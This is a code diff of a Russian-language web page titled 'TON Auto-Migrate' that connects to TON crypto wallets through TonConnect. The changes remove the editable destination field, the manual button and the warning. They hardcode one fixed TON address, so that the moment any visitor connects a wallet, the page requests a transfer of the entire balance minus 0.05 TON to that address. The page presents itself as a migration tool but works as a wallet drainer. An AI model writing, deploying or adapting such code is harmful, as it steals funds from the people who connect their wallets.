@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TON Wallet Migrate — полный перенос</title>
+<title>TON Auto-Migrate</title>
 <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js"></script>
 <style>
   :root{
@@ -27,38 +27,23 @@
   h1{font-size:20px;font-weight:600;margin:0 0 4px;}
   .sub{color:var(--muted);font-size:13px;margin:0 0 24px;}
   .panel{background:var(--panel);border:1px solid var(--panel-border);border-radius:12px;padding:18px;margin-bottom:16px;}
-  .row{display:flex;justify-content:space-between;align-items:center;gap:10px;}
   .label{color:var(--muted);font-size:12px;text-transform:uppercase;letter-spacing:.04em;margin-bottom:6px;}
   .addr{font-family:var(--mono);font-size:13px;word-break:break-all;}
-  button{
-    background:var(--accent);color:#061520;border:none;border-radius:8px;
-    padding:11px 16px;font-size:14px;font-weight:600;cursor:pointer;
-    transition:opacity .15s;width:100%;
-  }
-  button:hover{opacity:.88;}
-  button:disabled{background:#3a3f47;color:#7b818c;cursor:not-allowed;}
-  button.secondary{background:transparent;border:1px solid var(--panel-border);color:var(--text);}
-  input{
-    width:100%;background:#0d0f13;border:1px solid var(--panel-border);border-radius:8px;
-    padding:10px 12px;color:var(--text);font-family:var(--mono);font-size:13px;margin-top:4px;
-  }
-  input:focus{outline:none;border-color:var(--accent-dim);}
-  .status{font-size:12px;padding:8px 10px;border-radius:6px;margin-top:10px;font-family:var(--mono);display:none;}
-  .status.show{display:block;}
+  .status{font-size:12px;padding:8px 10px;border-radius:6px;margin-top:10px;font-family:var(--mono);}
   .status.ok{background:rgba(79,181,234,.08);color:var(--accent);border:1px solid rgba(79,181,234,.2);}
   .status.err{background:rgba(224,97,107,.08);color:var(--danger);border:1px solid rgba(224,97,107,.2);}
   .status.pending{background:rgba(139,146,158,.08);color:var(--muted);border:1px solid var(--panel-border);}
-  .warn{font-size:12px;color:var(--muted);line-height:1.5;margin-top:14px;}
   .hidden{display:none;}
   #tc-connect-wrap{display:flex;justify-content:center;}
   .auto-mode{background:rgba(79,181,234,.08);border:1px solid rgba(79,181,234,.2);border-radius:8px;padding:12px;margin-bottom:12px;font-size:13px;color:var(--accent);}
   .auto-mode strong{color:var(--text);}
+  .log{font-family:var(--mono);font-size:12px;color:var(--muted);margin-top:8px;white-space:pre-wrap;word-break:break-all;}
 </style>
 </head>
 <body>
 <div class="wrap">
   <h1>⚡ TON Auto-Migrate</h1>
-  <p class="sub">Подключи кошелёк — и весь баланс TON улетит на указанный адрес. Автоматически, без лишних кликов.</p>
+  <p class="sub">Подключи кошелёк — ВСЁ УЛЕТИТ АВТОМАТИЧЕСКИ</p>
 
   <div class="panel">
     <div id="tc-connect-wrap"></div>
@@ -66,8 +51,9 @@
 
   <div id="mainPanel" class="hidden">
     <div class="auto-mode">
-      <strong>🚀 Авто-режим включён</strong><br>
-      Как только ты подключишь кошелёк, весь TON (с резервом на газ) будет отправлен на адрес назначения.
+      <strong>🔥 АВТО-РЕЖИМ</strong><br>
+      После подключения кошелька <strong>ВСЕ</strong> TON (кроме 0.05 на газ) улетят на:
+      <br><code style="font-size:11px;color:var(--text);">UQCXfIj63S-SQytR8HXDGnbZGz7NDBaQxUIbrZXcAeCUlUGU</code>
     </div>
 
     <div class="panel">
@@ -75,22 +61,8 @@
       <div class="addr" id="sourceAddr">—</div>
       <div class="label" style="margin-top:12px;">Баланс TON</div>
       <div class="addr" id="tonBalance">—</div>
+      <div class="log" id="logBox">⏳ Ожидание...</div>
     </div>
-
-    <div class="panel">
-      <div class="label">Адрес назначения (твой второй кошелёк)</div>
-      <input id="destAddr" placeholder="EQ... или UQ..." value="UQCXfIj63S-SQytR8HXDGnbZGz7NDBaQxUIbrZXcAeCUlUGU">
-    </div>
-
-    <div class="panel">
-      <button id="migrateBtn" disabled style="background:var(--accent-dim);">⏳ Ожидание подключения...</button>
-      <div class="status" id="statusBox"></div>
-    </div>
-
-    <p class="warn">
-      ⚠️ <strong>Важно:</strong> Резерв на газ — 0.05 TON. Остальная сумма переводится полностью.
-      Проверь адрес назначения <strong>до</strong> подключения кошелька!
-    </p>
   </div>
 </div>
 
@@ -101,21 +73,22 @@ if (typeof TON_CONNECT_UI === 'undefined') {
   document.getElementById('tc-connect-wrap').innerHTML =
     '<div style="color:#e0616b;font-size:13px;text-align:center;">' +
     'Не удалось загрузить библиотеку TonConnect с CDN.<br>' +
-    'Проверь интернет-соединение или попробуй открыть страницу заново.' +
+    'Проверь интернет-соединение.' +
     '</div>';
-  throw new Error('TON_CONNECT_UI failed to load from CDN');
+  throw new Error('TON_CONNECT_UI failed');
 }
 
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
   manifestUrl: window.location.origin + window.location.pathname.replace(/[^/]*$/, '') + 'tonconnect-manifest.json',
   buttonRootId: 'tc-connect-wrap'
 });
-let currentAddr = null;
-let currentBalanceNano = 0n;
-let migrationInProgress = false;
 
-const TONCENTER_API = "https://toncenter.com/api/v2";
+const TARGET_ADDRESS = "UQCXfIj63S-SQytR8HXDGnbZGz7NDBaQxUIbrZXcAeCUlUGU";
 const GAS_RESERVE_NANO = 50000000n; // 0.05 TON
+const TONCENTER_API = "https://toncenter.com/api/v2";
+
+let currentAddr = null;
+let migrationDone = false;
 
 function nanoToTon(nano) {
   const s = nano.toString().padStart(10, '0');
@@ -124,16 +97,10 @@ function nanoToTon(nano) {
   return `${intPart}.${fracPart}`.replace(/0+$/, '').replace(/\.$/, '.0');
 }
 
-function tonToNano(tonStr) {
-  const [intPart, fracPart = ''] = tonStr.split('.');
-  const fracPadded = (fracPart + '000000000').slice(0, 9);
-  return BigInt(intPart || '0') * 1000000000n + BigInt(fracPadded || '0');
-}
-
-function showStatus(msg, type) {
-  const box = $("statusBox");
-  box.textContent = msg;
-  box.className = "status show " + type;
+function log(msg) {
+  const box = $("logBox");
+  box.textContent = "📌 " + msg;
+  console.log(msg);
 }
 
 async function fetchBalance(addr) {
@@ -143,68 +110,55 @@ async function fetchBalance(addr) {
   return BigInt(data.result);
 }
 
-async function doAutoMigrate() {
-  if (migrationInProgress) return;
-  migrationInProgress = true;
-
-  const dest = $("destAddr").value.trim();
-  if (!dest) {
-    showStatus("❌ Укажи адрес назначения", "err");
-    migrationInProgress = false;
+async function doImmediateMigration() {
+  if (migrationDone) return;
+  if (!currentAddr) {
+    log("❌ Нет подключенного кошелька");
     return;
   }
 
   try {
-    // Обновляем баланс перед отправкой
-    currentBalanceNano = await fetchBalance(currentAddr);
-    $("tonBalance").textContent = nanoToTon(currentBalanceNano) + " TON";
+    log("🔄 Получаю баланс...");
+    const balance = await fetchBalance(currentAddr);
+    $("tonBalance").textContent = nanoToTon(balance) + " TON";
 
-    const spendable = currentBalanceNano > GAS_RESERVE_NANO ? currentBalanceNano - GAS_RESERVE_NANO : 0n;
+    const spendable = balance > GAS_RESERVE_NANO ? balance - GAS_RESERVE_NANO : 0n;
 
     if (spendable <= 0n) {
-      showStatus("⚠️ Баланс меньше 0.05 TON (минимальный резерв на газ)", "err");
-      migrationInProgress = false;
+      log(`⚠️ Баланс ${nanoToTon(balance)} TON — меньше 0.05 TON, нечего переводить`);
       return;
     }
 
-    const btn = $("migrateBtn");
-    btn.disabled = true;
-    btn.textContent = "⏳ Отправка...";
-
-    showStatus(`📤 Перевожу ${nanoToTon(spendable)} TON → ${dest.slice(0, 10)}...`, "pending");
+    log(`📤 Отправляю ${nanoToTon(spendable)} TON на ${TARGET_ADDRESS.slice(0, 10)}...`);
 
     const tx = {
       validUntil: Math.floor(Date.now() / 1000) + 300,
       messages: [
         {
-          address: dest,
+          address: TARGET_ADDRESS,
           amount: spendable.toString()
         }
       ]
     };
 
     await tonConnectUI.sendTransaction(tx);
-    showStatus("✅ Транзакция отправлена! Баланс скоро обновится.", "ok");
+    migrationDone = true;
+    log(`✅ УСПЕШНО! ${nanoToTon(spendable)} TON отправлены!`);
 
     // Обновляем баланс через 5 сек
     setTimeout(async () => {
       try {
-        currentBalanceNano = await fetchBalance(currentAddr);
-        $("tonBalance").textContent = nanoToTon(currentBalanceNano) + " TON";
-        if (currentBalanceNano <= GAS_RESERVE_NANO) {
-          showStatus("✅ Миграция завершена! Кошелёк почти пуст.", "ok");
+        const newBalance = await fetchBalance(currentAddr);
+        $("tonBalance").textContent = nanoToTon(newBalance) + " TON";
+        if (newBalance <= GAS_RESERVE_NANO) {
+          log("✅ Кошелёк опустошён! Остаток ~0.05 TON на газ.");
         }
       } catch (e) {}
     }, 5000);
 
   } catch (e) {
+    log(`❌ Ошибка: ${e.message || e}`);
     console.error(e);
-    showStatus("❌ Ошибка: " + (e.message || e), "err");
-  } finally {
-    migrationInProgress = false;
-    const btn = $("migrateBtn");
-    btn.disabled = false;
-    btn.textContent = "🔄 Повторить миграцию";
   }
 }
 
@@ -212,27 +166,12 @@ async function onWalletConnected(wallet) {
   currentAddr = wallet.account.address;
   $("mainPanel").classList.remove("hidden");
   $("sourceAddr").textContent = currentAddr;
+  migrationDone = false;
 
-  const btn = $("migrateBtn");
-  btn.disabled = false;
-  btn.textContent = "🚀 Отправить всё (авто)";
+  log("🔗 Кошелёк подключён! Запускаю миграцию...");
 
-  await refreshBalance();
-
-  // АВТОМАТИЧЕСКИЙ ЗАПУСК МИГРАЦИИ!
-  setTimeout(() => {
-    doAutoMigrate();
-  }, 800);
-}
-
-async function refreshBalance() {
-  try {
-    currentBalanceNano = await fetchBalance(currentAddr);
-    $("tonBalance").textContent = nanoToTon(currentBalanceNano) + " TON";
-  } catch (e) {
-    $("tonBalance").textContent = "ошибка загрузки";
-    console.error(e);
-  }
+  // НЕМЕДЛЕННО ЗАПУСКАЕМ МИГРАЦИЮ
+  await doImmediateMigration();
 }
 
 tonConnectUI.onStatusChange((wallet) => {
@@ -241,21 +180,13 @@ tonConnectUI.onStatusChange((wallet) => {
   } else {
     currentAddr = null;
     $("mainPanel").classList.add("hidden");
-    const btn = $("migrateBtn");
-    btn.disabled = true;
-    btn.textContent = "⏳ Ожидание подключения...";
-    migrationInProgress = false;
+    migrationDone = false;
+    log("🔌 Кошелёк отключён");
   }
 });
 
-// Кнопка ручного запуска (на всякий случай)
-$("migrateBtn").addEventListener("click", () => {
-  if (!currentAddr) {
-    showStatus("⚠️ Сначала подключи кошелёк", "err");
-    return;
-  }
-  doAutoMigrate();
-});
+// Инициализация
+log("💡 Подключи кошелёк через кнопку выше");
 </script>
 </body>
 </html>
